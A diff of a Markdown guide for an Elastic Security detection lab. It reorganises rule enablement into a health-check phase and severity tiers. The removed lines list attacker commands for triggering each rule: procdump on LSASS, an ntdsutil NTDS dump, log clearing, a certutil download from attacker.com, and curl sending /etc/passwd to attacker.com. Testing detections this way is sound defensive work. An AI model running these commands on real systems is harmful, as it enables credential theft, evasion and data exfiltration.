@@ -842,17 +842,19 @@ event.module: "windows" or event.dataset: "windows.security"
 
 ## 19. Phase 10 — Elastic Security & Detection Rules
 
-### Enable Elastic Security
+### Phase 1 — Prerequisites
 
+Before enabling any rules, verify that data is actually flowing into the expected data streams. Rules firing against empty indices produce no alerts and give false confidence.
+
+**Enable Elastic Security:**
 Kibana → **Security** (left sidebar) → **Get started**.
 
-### Load prebuilt detection rules
-
+**Load all prebuilt rules:**
 ```
 Security → Rules → Detection Rules → Add Elastic rules
 ```
 
-### Data stream health check (run before enabling any rules)
+**Data stream health check — run this first:**
 
 ```json
 GET /_data_stream/logs-windows.sysmon_operational-default/_stats
@@ -862,41 +864,66 @@ GET /_data_stream/logs-nginx.access-default/_stats
 GET /_cat/indices/logs-*?v&s=index&h=index,docs.count,store.size
 ```
 
+**Fleet agent health check:**
+```bash
+docker logs agent-websrv --tail 30 | grep -E "error|warn|skip"
+docker logs agent-proxy --tail 30 | grep -E "error|warn|skip"
+```
+
+Only proceed to Phase 2 once all expected data streams show non-zero doc counts and agents report healthy.
+
 ---
 
-### Tier 1 — Critical Rules (Enable First)
+### Phase 2 — Production Rule Enablement
+
+Enable rules in this exact priority order.
+
+---
+
+### 🔴 Tier 1 — Enable First (Critical Severity)
+
+```
+Kibana → Security → Rules → Detection Rules → Filter: Severity = Critical → Enable All
+```
 
 #### Windows (AD + WSUS)
 
-| Rule Name | MITRE | How to Trigger |
-|-----------|-------|----------------|
-| **Suspicious Lsass Process Access** | T1003.001 | `procdump.exe -ma lsass.exe` |
-| **LSASS Memory Dump Handle Access** | T1003.001 | Task Manager → right-click lsass → Create Dump File |
-| **Potential Credential Access via Windows Utilities** | T1003 | `ntdsutil "ac i ntds" "ifm" "create full C:\temp" q q` |
-| **Potential Shadow Credentials added to AD Object** | T1556 | `Whisker.exe add /target:targetuser` |
-| **Windows Event Log Cleared** | T1070.001 | `wevtutil cl Security` |
-| **Disable Windows Event and Security Logs Using Built-in Tools** | T1562.002 | `auditpol /set /category:* /success:disable /failure:disable` |
-| **A scheduled task was created** | T1053.005 | `schtasks /create /tn "evil" /tr C:\evil.exe /sc daily` |
-| **Persistence via WMI Event Subscription** | T1546.003 | `wmic /namespace:\\root\subscription PATH __EventFilter CREATE` |
-| **Windows Service Installed via an Unusual Client** | T1543.003 | Create service from non-standard binary |
-| **Potential PowerShell HackTool Script by Function Names** | T1059.001 | `Invoke-Mimikatz` or `Invoke-BloodHound` |
-| **Suspicious Powershell Script** | T1059.001 | `IEX (New-Object Net.WebClient).DownloadString(...)` |
-| **Network Connection via Certutil** | T1105 | `certutil.exe -urlcache -f http://attacker.com/evil.exe` |
+| Rule Name | Why Critical |
+|-----------|-------------|
+| **Suspicious Lsass Process Access** | Core credential theft detection |
+| **LSASS Memory Dump Handle Access** | Mimikatz / procdump detection |
+| **Potential Credential Access via Windows Utilities** | NTDS / VSS abuse |
+| **Windows Event Log Cleared** | Attacker covering tracks |
+| **Disable Windows Event and Security Logs Using Built-in Tools** | Attacker killing visibility |
+| **A scheduled task was created** | Most common persistence method |
+| **Persistence via WMI Event Subscription** | Stealthy persistence |
+| **Potential Shadow Credentials added to AD Object** | AD-specific backdoor |
+| **Windows Service Installed via an Unusual Client** | Malicious service install |
+| **Potential PowerShell HackTool Script by Function Names** | Mimikatz / BloodHound in PS |
+| **Suspicious Powershell Script** | Obfuscated PS execution |
+| **Network Connection via Certutil** | Living-off-the-land download |
 
 #### Linux (Proxy + Web)
 
-| Rule Name | MITRE | How to Trigger |
-|-----------|-------|----------------|
-| **Web Shell Detection: Script Process Child of Common Web Process** | T1505.003 | Drop webshell → trigger via HTTP |
-| **Unusual Web Server Command Execution** | T1505.003 | Nginx worker spawning `id`, `whoami` |
-| **Suspicious Child Execution via Web Server** | T1505.003 | Web process spawning `curl`, `wget`, `nc` |
-| **Linux Restricted Shell Breakout via Linux Binaries** | T1059.004 | `find . -exec /bin/sh \; -quit` |
-| **Systemd Service Created** | T1543.002 | Write unit file → `systemctl enable evil.service` |
-| **Potential Data Exfiltration Through Curl** | T1048 | `curl -F "data=@/etc/passwd" https://attacker.com` |
+| Rule Name | Why Critical |
+|-----------|-------------|
+| **Web Shell Detection: Script Process Child of Common Web Process** | Active compromise of web server |
+| **Unusual Web Server Command Execution** | RCE on web server |
+| **Suspicious Child Execution via Web Server** | Web process spawning shell |
+| **Linux Restricted Shell Breakout via Linux Binaries** | Container / shell escape |
+| **Systemd Service Created** | Linux persistence |
+| **Potential Data Exfiltration Through Curl** | Data theft in progress |
 
 ---
 
-### Tier 2 — High Severity Rules (Enable Second)
+### 🟠 Tier 2 — Enable Second (High Severity)
+
+```
+Kibana → Security → Rules → Detection Rules → Filter: Severity = High
+→ Enable All that match Windows, Linux, or Active Directory tags
+```
+
+Key rules to confirm are active:
 
 | Rule Name | Machine |
 |-----------|---------|
@@ -907,6 +934,7 @@ GET /_cat/indices/logs-*?v&s=index&h=index,docs.count,store.size
 | **Uncommon Registry Persistence Change** | AD + WSUS |
 | **PowerShell Suspicious Discovery Related Windows API Functions** | AD + WSUS |
 | **Windows Subsystem for Linux Enabled via Dism Utility** | WSUS |
+| **IIS HTTP Logging Disabled** | WSUS |
 | **Cron Job Created or Modified** | Proxy + Web |
 | **Python Site or User Customize File Creation** | Web |
 | **APT Package Manager Configuration File Creation** | Proxy + Web |
@@ -917,14 +945,16 @@ GET /_cat/indices/logs-*?v&s=index&h=index,docs.count,store.size
 
 ---
 
-### Enabling Method
+### 🟡 Tier 3 — Enable Last (Medium Severity)
 
 ```
-Kibana → Security → Detection Rules
-→ Filter: Severity = Critical → Enable All (Windows + Linux tags)
-→ Filter: Severity = High → Enable relevant ones
-→ Skip: AWS, GCP, Kubernetes, Office365 (noise in this lab)
+Kibana → Security → Rules → Detection Rules → Filter: Severity = Medium
+→ Review each rule individually before enabling
 ```
+
+Only enable what makes sense for your environment. **Skip rules tagged AWS, GCP, Kubernetes, or Office365** — they will only generate noise and false positives in this lab.
+
+---
 
 ### Index pattern note
 
